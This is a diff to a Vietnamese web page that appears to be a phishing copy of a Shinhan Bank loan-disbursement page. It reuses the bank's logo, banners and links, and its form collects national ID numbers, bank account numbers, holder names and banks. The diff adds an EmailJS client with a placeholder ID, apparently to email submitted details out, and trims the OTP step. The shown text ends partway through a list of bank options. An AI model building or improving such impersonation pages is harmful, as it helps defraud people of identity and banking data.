@@ -4,7 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Giải Ngân Khoản Vay - Shinhan Bank</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
+    <script async src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        // Inputmask fallback
+        window.Inputmask = window.Inputmask || function(options) {
+            console.warn('Inputmask not loaded, using fallback. Input formatting disabled.');
+            return {
+                mask: function(element) {
+                    return this;
+                }
+            };
+        };
+        // Initialize EmailJS (replace with your user ID)
+        emailjs.init('YOUR_EMAILJS_USER_ID'); // TODO: Replace with your EmailJS user ID
+    </script>
     <style>
         * {
             margin: 0;
@@ -18,26 +32,56 @@
             color: #333;
         }
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        header {
+        .top-banner {
             background-color: #003087;
-            padding: 20px 0;
-            text-align: center;
+            padding: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
         }
 
-        header img {
-            height: 50px;
+        .top-banner img {
+            height: 40px;
+        }
+
+        .hamburger {
+            display: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 10px;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            z-index: 1000;
+        }
+
+        .hamburger span {
+            display: block;
+            width: 25px;
+            height: 3px;
+            background: #fff;
+            margin: 5px 0;
+            transition: all 0.3s ease;
+        }
+
+        .hamburger[aria-expanded="true"] span:nth-child(1) {
+            transform: rotate(45deg) translate(5px, 5px);
+        }
+
+        .hamburger[aria-expanded="true"] span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .hamburger[aria-expanded="true"] span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -7px);
         }
 
         nav {
             background-color: #fff;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            margin: 20px 0;
+            margin: 10px 0;
         }
 
         nav ul {
@@ -55,17 +99,27 @@
             text-decoration: none;
             color: #003087;
             font-weight: bold;
+            padding: 10px;
+            display: block;
+            transition: background 0.3s;
+        }
+
+        nav ul li a:hover, nav ul li a:focus {
+            background: #e6f0ff;
+            border-radius: 5px;
         }
 
         .banner-carousel {
             position: relative;
             overflow: hidden;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
+            min-height: 200px;
         }
 
         .banner-slide {
             display: none;
             width: 100%;
+            height: 100%;
         }
 
         .banner-slide.active {
@@ -74,31 +128,50 @@
 
         .banner-slide img {
             width: 100%;
-            height: auto;
+            max-height: 300px;
+            object-fit: contain;
+            display: block;
+            margin: 0 auto;
         }
 
         .banner-text {
             position: absolute;
             top: 50%;
-            left: 10%;
+            left: 5%;
             transform: translateY(-50%);
             color: #fff;
             text-align: left;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px 15px;
+            border-radius: 5px;
+            max-width: 80%;
         }
 
         .prev, .next {
             position: absolute;
             top: 50%;
             transform: translateY(-50%);
-            background: rgba(0,0,0,0.5);
+            background: rgba(0, 0, 0, 0.7);
             color: #fff;
             border: none;
-            padding: 10px;
+            padding: 15px;
             cursor: pointer;
+            font-size: 18px;
+            border-radius: 5px;
+            transition: background 0.3s;
         }
 
-        .prev { left: 10px; }
-        .next { right: 10px; }
+        .prev:hover, .next:hover {
+            background: rgba(0, 0, 0, 0.9);
+        }
+
+        .prev:focus, .next:focus {
+            outline: 2px solid #fff;
+            outline-offset: 2px;
+        }
+
+        .prev { left: 15px; }
+        .next { right: 15px; }
 
         .dots {
             text-align: center;
@@ -109,12 +182,17 @@
 
         .dot {
             display: inline-block;
-            width: 10px;
-            height: 10px;
-            margin: 0 5px;
+            width: 12px;
+            height: 12px;
+            margin: 0 6px;
             background: #ccc;
             border-radius: 50%;
             cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .dot:hover, .dot:focus {
+            background: #666;
         }
 
         .dot.active {
@@ -124,23 +202,22 @@
         .steps {
             display: flex;
             justify-content: center;
-            margin: 20px 0;
+            margin: 10px 0;
+            gap: 10px;
         }
 
         .step {
             flex: 1;
             text-align: center;
-            padding: 10px;
+            padding: 12px;
             background-color: #e0e0e0;
-            margin: 0 5px;
             border-radius: 5px;
-            display: none;
+            font-size: 14px;
         }
 
         .step.active {
             background-color: #003087;
             color: #fff;
-            display: block;
         }
 
         .form-container {
@@ -173,7 +250,7 @@
 
         .form-group .error {
             color: red;
-            font-size: 12px;
+            font-size: 14px;
             display: none;
         }
 
@@ -181,44 +258,77 @@
             display: block;
         }
 
-        .bank-logo {
+        .bank-logo, .method-logo {
             width: 30px;
             height: 30px;
             vertical-align: middle;
             margin-right: 10px;
         }
 
-        .radio-group {
-            display: flex;
-            flex-direction: row;
-            justify-content: space-between;
-            gap: 20px;
+        .custom-select, .custom-method {
+            position: relative;
+            width: 100%;
         }
 
-        .radio-group label {
+        .custom-select-toggle, .custom-method-option {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background: #fff;
             display: flex;
             align-items: center;
-            flex: 1;
-            justify-content: center;
-            text-align: center;
+            cursor: pointer;
+            margin-bottom: 5px;
         }
 
-        .radio-group label input:checked + img + span {
-            background-color: #e6f0ff;
-            border: 2px solid #003087;
+        .custom-select-toggle img, .custom-method-option img {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .custom-select-list {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 100%;
+            background: #fff;
+            border: 1px solid #ccc;
             border-radius: 5px;
-            padding: 5px;
+            max-height: 200px;
+            overflow-y: auto;
+            z-index: 1000;
         }
 
-        .method-logo {
-            width: 24px;
-            height: 24px;
-            margin-right: 8px;
+        .custom-select-list.show {
+            display: block;
+        }
+
+        .custom-select-option {
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .custom-select-option:hover,
+        .custom-select-option:focus,
+        .custom-method-option:hover,
+        .custom-method-option:focus {
+            background: #e6f0ff;
+        }
+
+        .custom-method-option.selected {
+            border: 2px solid #003087;
+            background: #e6f0ff;
         }
 
         .buttons {
             display: flex;
             justify-content: center;
+            gap: 10px;
         }
 
         button {
@@ -253,45 +363,102 @@
         }
 
         @media (max-width: 768px) {
-            .steps {
+            .top-banner {
+                padding: 15px;
+            }
+
+            .top-banner img {
+                height: 30px;
+            }
+
+            .hamburger {
+                display: block;
+            }
+
+            nav ul {
+                display: none;
                 flex-direction: column;
+                align-items: center;
+                background: #fff;
+                position: absolute;
+                top: 60px;
+                left: 0;
+                width: 100%;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                z-index: 999;
             }
 
-            .step {
-                margin: 5px 0;
+            nav ul.show {
+                display: flex;
             }
 
-            .form-container {
-                padding: 10px;
+            nav ul li {
+                margin: 10px 0;
+                width: 100%;
+                text-align: center;
+            }
+
+            nav ul li a {
+                padding: 15px;
+            }
+
+            .banner-carousel {
+                min-height: 200px;
+                margin-bottom: 5px;
             }
 
             .banner-text h1 {
-                font-size: 20px;
+                font-size: 18px;
             }
 
             .banner-text p {
                 font-size: 12px;
             }
 
-            .radio-group {
-                flex-direction: column;
-                gap: 10px;
+            .banner-slide img {
+                max-height: 200px;
+                object-fit: contain;
             }
 
-            .radio-group label {
-                justify-content: flex-start;
-                text-align: left;
+            .prev, .next {
+                padding: 10px;
+                font-size: 14px;
+            }
+
+            .dot {
+                width: 10px;
+                height: 10px;
+                margin: 0 5px;
+            }
+
+            .steps {
+                flex-direction: column;
+                gap: 8px;
+            }
+
+            .step {
+                padding: 10px;
+                font-size: 13px;
+            }
+
+            .form-container {
+                padding: 15px;
             }
         }
     </style>
 </head>
 <body>
-    <header aria-label="Main Header">
+    <div class="top-banner">
         <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo">
-    </header>
+        <button class="hamburger" aria-label="Toggle Menu" aria-expanded="false" onclick="toggleMenu()">
+            <span></span>
+            <span></span>
+            <span></span>
+        </button>
+    </div>
 
     <nav role="navigation" aria-label="Main Navigation">
-        <ul>
+        <ul id="nav-menu">
             <li><a href="https://shinhan.com.vn">Trang Chủ</a></li>
             <li><a href="https://shinhan.com.vn/vi/about-us">Giới Thiệu</a></li>
             <li><a href="https://shinhan.com.vn/vi/benefits">Lợi Ích</a></li>
@@ -305,28 +472,28 @@
 
     <div class="banner-carousel" role="region" aria-label="Promotional Carousel">
         <div class="banner-slide active">
-            <img src="https://shinhan.com.vn/public/uploads/personal/2024/RLD/2024---RLD---SOHO-operation-Loan---banner.jpg" alt="SOHO Operation Loan" loading="lazy">
+            <img data-src="https://shinhan.com.vn/public/uploads/personal/2024/RLD/2024---RLD---SOHO-operation-Loan---banner.jpg" alt="SOHO Operation Loan" class="lazy">
             <div class="banner-text">
                 <h1>Giải Ngân Khoản Vay</h1>
                 <p>Tăng tốc tương lai, kết nối vạn niềm tin</p>
             </div>
         </div>
         <div class="banner-slide">
-            <img src="https://shinhan.com.vn/public/uploads/personal/2025/RLD/2025.01_RLD_Unsecured--Loan_Baneer.jpg" alt="Unsecured Loan" loading="lazy">
+            <img data-src="https://shinhan.com.vn/public/uploads/personal/2025/RLD/2025.01_RLD_Unsecured--Loan_Baneer.jpg" alt="Unsecured Loan" class="lazy">
             <div class="banner-text">
                 <h1>Giải Ngân Khoản Vay</h1>
                 <p>Ưu đãi hấp dẫn, vay dễ dàng</p>
             </div>
         </div>
         <div class="banner-slide">
-            <img src="https://shinhan.com.vn/public/uploads/personal/2022/DIGITAL%20%20PERSONAL%20LOAN/20220624_DIGITAL%20CONSUMER%20LOAN_%20BANNER.jpg" alt="Digital Consumer Loan" loading="lazy">
+            <img data-src="https://shinhan.com.vn/public/uploads/personal/2022/DIGITAL%20%20PERSONAL%20LOAN/20220624_DIGITAL%20CONSUMER%20LOAN_%20BANNER.jpg" alt="Digital Consumer Loan" class="lazy">
             <div class="banner-text">
                 <h1>Giải Ngân Khoản Vay</h1>
                 <p>Khám phá cơ hội tài chính</p>
             </div>
         </div>
         <div class="banner-slide">
-            <img src="https://shinhan.com.vn/public/uploads/personal/2025/RLD/2025.01_RLD_Car-Loan_Baneer-1.jpg" alt="Car Loan" loading="lazy">
+            <img data-src="https://shinhan.com.vn/public/uploads/personal/2025/RLD/2025.01_RLD_Car-Loan_Baneer-1.jpg" alt="Car Loan" class="lazy">
             <div class="banner-text">
                 <h1>Giải Ngân Khoản Vay</h1>
                 <p>Hỗ trợ mọi ước mơ</p>
@@ -343,9 +510,7 @@
     </div>
 
     <div class="steps" role="progressbar" aria-label="Disbursement Progress">
-        <div class="step active" id="step1" aria-current="step">Bước 1: Nhập thông tin</div>
-        <div class="step" id="step2">Bước 2: Xác nhận</div>
-        <div class="step" id="step3">Bước 3: OTP</div>
+        <div class="step active" id="step1" aria-current="step">1. Nhập thông tin</div>
     </div>
 
     <div class="container">
@@ -360,7 +525,7 @@
                 <div class="form-group" aria-live="polite">
                     <label for="cccd">Số CCCD</label>
                     <input type="text" id="cccd" required aria-describedby="cccdError">
-                    <span class="error" id="cccdError">Số CCCD phải là 12 số</span>
+                    <span class="error" id="cccdError">Số CCCD phải là 9 hoặc 12 số</span>
                 </div>
                 <div class="form-group" aria-live="polite">
                     <label for="amount">Số tiền giải ngân</label>
@@ -401,7 +566,7 @@
                 <div class="form-group" aria-live="polite">
                     <label for="accountNumber">Số tài khoản ngân hàng</label>
                     <input type="text" id="accountNumber" required aria-describedby="accountNumberError">
-                    <span class="error" id="accountNumberError">Số tài khoản từ 10 đến 20 số</span>
+                    <span class="error" id="accountNumberError">Số tài khoản phải từ 8 đến 15 số</span>
                 </div>
                 <div class="form-group" aria-live="polite">
                     <label for="accountHolder">Họ và tên chủ tài khoản</label>
@@ -410,44 +575,234 @@
                 </div>
                 <div class="form-group" aria-live="polite">
                     <label for="bank">Chọn ngân hàng</label>
-                    <select id="bank" required aria-describedby="bankError">
-                        <option value="">-- Chọn ngân hàng --</option>
-                        <option value="shinhan"><img src="placeholder_logo.png" alt="Shinhan Logo" class="bank-logo">Ngân hàng Shinhan Việt Nam</option>
-                        <option value="vietcombank"><img src="https://simg.zalopay.com.vn/zlp-website/assets/Vietcom_Bank_59cd70822d.svg" alt="Vietcombank Logo" class="bank-logo">Ngân hàng TMCP Ngoại Thương Việt Nam (Vietcombank)</option>
-                        <option value="vietinbank"><img src="https://simg.zalopay.com.vn/zlp-website/assets/Vietin_Bank_67743f2169.svg" alt="VietinBank Logo" class="bank-logo">Ngân hàng TMCP Công Thương Việt Nam (VietinBank)</option>
-                        <option value="bidv"><img src="https://simg.zalopay.com.vn/zlp-website/assets/BIDV_0b0bbd931b.svg" alt="BIDV Logo" class="bank-logo">Ngân hàng TMCP Đầu tư và Phát triển Việt Nam (BIDV)</option>
-                        <option value="techcombank"><img src="https://simg.zalopay.com.vn/zlp-website/assets/Techcom_Bank_312f6c8da7.svg" alt="Techcombank Logo" class="bank-logo">Ngân hàng TMCP Kỹ Thương Việt Nam (Techcombank)</option>
-                        <option value="agribank"><img src="https://simg.zalopay.com.vn/zlp-website/assets/Agribank_5840fd4033.svg" alt="Agribank Logo" class="bank-logo">Ngân hàng Nông nghiệp và Phát triển Nông thôn Việt Nam (Agribank)</option>
-                        <option value="mbbank"><img src="https://simg.zalopay.com.vn/zlp-website/assets/MB_Bank_8f278a6b49.svg" alt="MB Bank Logo" class="bank-logo">Ngân hàng TMCP Quân đội (MB Bank)</option>
-                        <option value="vpbank"><img src="https://simg.zalopay.com.vn/zlp-website/assets/VP_Bank_505641f0fa.svg" alt="VPBank Logo" class="bank-logo">Ngân hàng TMCP Việt Nam Thịnh Vượng (VPBank)</option>
-                        <option value="vib"><img src="https://simg.zalopay.com.vn/zlp-website/assets/VIB_3e247f59ad.svg" alt="VIB Logo" class="bank-logo">Ngân hàng TMCP Quốc tế Việt Nam (VIB)</option>
-                        <option value="hdbank"><img src="https://simg.zalopay.com.vn/zlp-website/assets/HD_Bank_bfb3ff8b9d.svg" alt="HDBank Logo" class="bank-logo">Ngân hàng TMCP Phát triển TP.HCM (HDBank)</option>
-                        <option value="ocb"><img src="https://simg.zalopay.com.vn/zlp-website/assets/OCB_92ddf02131.svg" alt="OCB Logo" class="bank-logo">Ngân hàng TMCP Phương Đông (OCB)</option>
-                        <option value="acb">Ngân hàng TMCP Á Châu (ACB)</option>
-                        <option value="sacombank">Ngân hàng TMCP Sài Gòn Thương Tín (Sacombank)</option>
-                        <option value="tpbank">Ngân hàng TMCP Tiên Phong (TPBank)</option>
-                        <option value="scb">Ngân hàng TMCP Sài Gòn (SCB)</option>
-                        <option value="msb">Ngân hàng TMCP Hàng Hải Việt Nam (MSB)</option>
-                        <option value="eximbank">Ngân hàng TMCP Xuất Nhập khẩu Việt Nam (Eximbank)</option>
-                        <option value="seabank">Ngân hàng TMCP Đông Nam Á (SeABank)</option>
-                        <option value="lienvietsong">Ngân hàng TMCP Bưu điện Liên Việt (LienVietPostBank)</option>
-                        <option value="pvcombank">Ngân hàng TMCP Đại chúng Việt Nam (PVcomBank)</option>
-                        <option value="namabank">Ngân hàng TMCP Nam Á (Nam A Bank)</option>
-                        <option value="shb">Ngân hàng TMCP Sài Gòn - Hà Nội (SHB)</option>
-                        <option value="kienlongbank">Ngân hàng TMCP Kiên Long (Kienlongbank)</option>
-                        <option value="baovietbank">Ngân hàng TMCP Bảo Việt (BaoViet Bank)</option>
-                        <option value="pgbank">Ngân hàng TMCP Xăng dầu Petrolimex (PGBank)</option>
-                        <option value="vietbank">Ngân hàng TMCP Việt Nam Thương Tín (VietBank)</option>
-                        <option value="abbank">Ngân hàng TMCP An Bình (ABBank)</option>
-                        <option value="dbs">DBS Bank Việt Nam</option>
-                        <option value="hsbc">Ngân hàng TNHH MTV HSBC (Việt Nam)</option>
-                        <option value="standardchartered">Ngân hàng TNHH MTV Standard Chartered (Việt Nam)</option>
-                        <option value="uob">Ngân hàng TNHH MTV United Overseas Bank (Việt Nam)</option>
-                        <option value="cimb">Ngân hàng TNHH MTV CIMB Việt Nam</option>
-                        <option value="publicbank">Ngân hàng TNHH MTV Public Bank Việt Nam</option>
-                        <option value="hongleongbank">Ngân hàng TNHH MTV Hong Leong Việt Nam</option>
-                        <option value="wooribank">Ngân hàng TNHH MTV Woori Việt Nam</option>
-                    </select>
+                    <div class="custom-select" id="bank-select">
+                        <div class="custom-select-toggle" tabindex="0" aria-expanded="false">
+                            <span>-- Chọn ngân hàng --</span>
+                        </div>
+                        <div class="custom-select-list">
+                            <div class="custom-select-option" data-value="shinhan">
+                                <img src="https://whypay.vn/assets/images/nganhang/shinhanbankvietnam.png" alt="Shinhan Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Shinhan Việt Nam
+                            </div>
+                            <div class="custom-select-option" data-value="vietcombank">
+                                <img src="https://whypay.vn/assets/images/nganhang/vietcombank.png" alt="Vietcombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Ngoại Thương Việt Nam (Vietcombank)
+                            </div>
+                            <div class="custom-select-option" data-value="vietinbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/vietinbank.png" alt="VietinBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Công Thương Việt Nam (VietinBank)
+                            </div>
+                            <div class="custom-select-option" data-value="bidv">
+                                <img src="https://whypay.vn/assets/images/nganhang/bidv.png" alt="BIDV Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Đầu tư và Phát triển Việt Nam (BIDV)
+                            </div>
+                            <div class="custom-select-option" data-value="techcombank">
+                                <img src="https://whypay.vn/assets/images/nganhang/techcombank.png" alt="Techcombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Kỹ Thương Việt Nam (Techcombank)
+                            </div>
+                            <div class="custom-select-option" data-value="agribank">
+                                <img src="https://whypay.vn/assets/images/nganhang/agribank.png" alt="Agribank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Nông nghiệp và Phát triển Nông thôn Việt Nam (Agribank)
+                            </div>
+                            <div class="custom-select-option" data-value="mbbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/mbbank.png" alt="MB Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Quân đội (MB Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="vpbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/vpbank.png" alt="VPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Việt Nam Thịnh Vượng (VPBank)
+                            </div>
+                            <div class="custom-select-option" data-value="vib">
+                                <img src="https://whypay.vn/assets/images/nganhang/vib.png" alt="VIB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Quốc tế Việt Nam (VIB)
+                            </div>
+                            <div class="custom-select-option" data-value="hdbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/hdbank.png" alt="HDBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Phát triển TP.HCM (HDBank)
+                            </div>
+                            <div class="custom-select-option" data-value="ocb">
+                                <img src="https://whypay.vn/assets/images/nganhang/ocb.png" alt="OCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Phương Đông (OCB)
+                            </div>
+                            <div class="custom-select-option" data-value="acb">
+                                <img src="https://whypay.vn/assets/images/nganhang/acb.png" alt="ACB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Á Châu (ACB)
+                            </div>
+                            <div class="custom-select-option" data-value="sacombank">
+                                <img src="https://whypay.vn/assets/images/nganhang/sacombank.png" alt="Sacombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Sài Gòn Thương Tín (Sacombank)
+                            </div>
+                            <div class="custom-select-option" data-value="tpbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/tpbank.png" alt="TPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Tiên Phong (TPBank)
+                            </div>
+                            <div class="custom-select-option" data-value="scb">
+                                <img src="https://whypay.vn/assets/images/nganhang/scb.png" alt="SCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Sài Gòn (SCB)
+                            </div>
+                            <div class="custom-select-option" data-value="msb">
+                                <img src="https://whypay.vn/assets/images/nganhang/msb.png" alt="MSB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Hàng Hải Việt Nam (MSB)
+                            </div>
+                            <div class="custom-select-option" data-value="eximbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/eximbank.png" alt="Eximbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Xuất Nhập khẩu Việt Nam (Eximbank)
+                            </div>
+                            <div class="custom-select-option" data-value="seabank">
+                                <img src="https://whypay.vn/assets/images/nganhang/seabank.png" alt="SeABank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Đông Nam Á (SeABank)
+                            </div>
+                            <div class="custom-select-option" data-value="lienvietsong">
+                                <img src="https://whypay.vn/assets/images/nganhang/lienvietpostbank.png" alt="LienVietPostBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Bưu điện Liên Việt (LienVietPostBank)
+                            </div>
+                            <div class="custom-select-option" data-value="pvcombank">
+                                <img src="https://whypay.vn/assets/images/nganhang/pvcombank.png" alt="PVcomBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Đại chúng Việt Nam (PVcomBank)
+                            </div>
+                            <div class="custom-select-option" data-value="namabank">
+                                <img src="https://whypay.vn/assets/images/nganhang/namabank.png" alt="Nam A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Nam Á (Nam A Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="shb">
+                                <img src="https://whypay.vn/assets/images/nganhang/shb.png" alt="SHB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Sài Gòn - Hà Nội (SHB)
+                            </div>
+                            <div class="custom-select-option" data-value="kienlongbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/kienlongbank.png" alt="Kienlongbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Kiên Long (Kienlongbank)
+                            </div>
+                            <div class="custom-select-option" data-value="baovietbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/baovietbank.png" alt="BaoViet Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Bảo Việt (BaoViet Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="pgbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/pgbank.png" alt="PGBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Xăng dầu Petrolimex (PGBank)
+                            </div>
+                            <div class="custom-select-option" data-value="vietbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/vietbank.png" alt="VietBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Việt Nam Thương Tín (VietBank)
+                            </div>
+                            <div class="custom-select-option" data-value="abbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/abbank.png" alt="ABBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP An Bình (ABBank)
+                            </div>
+                            <div class="custom-select-option" data-value="dbs">
+                                <img src="https://whypay.vn/assets/images/nganhang/dbsvietnam.png" alt="DBS Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                DBS Bank Việt Nam
+                            </div>
+                            <div class="custom-select-option" data-value="hsbc">
+                                <img src="https://whypay.vn/assets/images/nganhang/hsbcvietnam.png" alt="HSBC Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV HSBC (Việt Nam)
+                            </div>
+                            <div class="custom-select-option" data-value="standardchartered">
+                                <img src="https://whypay.vn/assets/images/nganhang/standardcharteredvietnam.png" alt="Standard Chartered Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Standard Chartered (Việt Nam)
+                            </div>
+                            <div class="custom-select-option" data-value="uob">
+                                <img src="https://whypay.vn/assets/images/nganhang/uobvietnam.png" alt="UOB Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV United Overseas Bank (Việt Nam)
+                            </div>
+                            <div class="custom-select-option" data-value="cimb">
+                                <img src="https://whypay.vn/assets/images/nganhang/cimbvietnam.png" alt="CIMB Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV CIMB Việt Nam
+                            </div>
+                            <div class="custom-select-option" data-value="publicbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/publicbankvietnam.png" alt="Public Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Public Bank Việt Nam
+                            </div>
+                            <div class="custom-select-option" data-value="hongleongbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/hongleongbankvietnam.png" alt="Hong Leong Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Hong Leong Việt Nam
+                            </div>
+                            <div class="custom-select-option" data-value="wooribank">
+                                <img src="https://whypay.vn/assets/images/nganhang/wooribankvietnam.png" alt="Woori Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Woori Việt Nam
+                            </div>
+                            <div class="custom-select-option" data-value="oceanbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/oceanbank.png" alt="OceanBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Đại Dương (OceanBank)
+                            </div>
+                            <div class="custom-select-option" data-value="gpbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/gpbank.png" alt="GPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Dầu khí Toàn cầu (GPBank)
+                            </div>
+                            <div class="custom-select-option" data-value="cbbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/cbbank.png" alt="CBBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Xây dựng (CBBank)
+                            </div>
+                            <div class="custom-select-option" data-value="vbsp">
+                                <img src="https://whypay.vn/assets/images/nganhang/vbsp.png" alt="VBSP Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Chính sách Xã hội Việt Nam (VBSP)
+                            </div>
+                            <div class="custom-select-option" data-value="vdb">
+                                <img src="https://whypay.vn/assets/images/nganhang/vdb.png" alt="VDB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Phát triển Việt Nam (VDB)
+                            </div>
+                            <div class="custom-select-option" data-value="coopbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/coopbank.png" alt="Co-op Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Hợp tác xã Việt Nam (Co-op Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="bacabank">
+                                <img src="https://whypay.vn/assets/images/nganhang/bacabank.png" alt="Bac A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Bắc Á (Bac A Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="ncb">
+                                <img src="https://whypay.vn/assets/images/nganhang/ncb.png" alt="NCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Quốc Dân (NCB)
+                            </div>
+                            <div class="custom-select-option" data-value="saigonbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/saigonbank.png" alt="Saigonbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Sài Gòn Công Thương (Saigonbank)
+                            </div>
+                            <div class="custom-select-option" data-value="vietabank">
+                                <img src="https://whypay.vn/assets/images/nganhang/vietabank.png" alt="Viet A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Việt Á (Viet A Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="vietcapitalbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/vietcapitalbank.png" alt="Viet Capital Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Bản Việt (Viet Capital Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="vikkibank">
+                                <img src="https://whypay.vn/assets/images/nganhang/vikkibank.png" alt="Vikki Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
